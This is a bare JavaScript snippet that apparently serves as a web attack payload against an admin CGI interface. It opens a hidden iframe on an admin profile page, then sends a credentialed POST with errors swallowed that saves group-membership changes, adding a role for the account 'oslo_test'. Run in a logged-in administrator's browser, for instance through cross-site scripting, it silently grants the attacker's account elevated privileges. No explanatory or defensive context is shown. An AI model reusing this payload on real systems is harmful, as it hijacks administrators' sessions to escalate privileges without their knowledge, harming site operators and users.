const f = document.createElement('iframe');
f.hidden = true;
f.src = '/cgi-bin/admin/person/admin_profile.pl?pid=oslo_test&action=groupmembers&GroupID=6';
document.body.appendChild(f);
f.onload = () => {
  try {
    f.contentWindow.fetch('/cgi-bin/admin/person/admin_profile.pl', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json'
      },
      body: 'pid=oslo_test&action=save_members&group_id=6&added_roles=%7B%221001%22%3A%7B%2293940%22%3A1%7D%7D'
    });
  } catch (e) {}
};
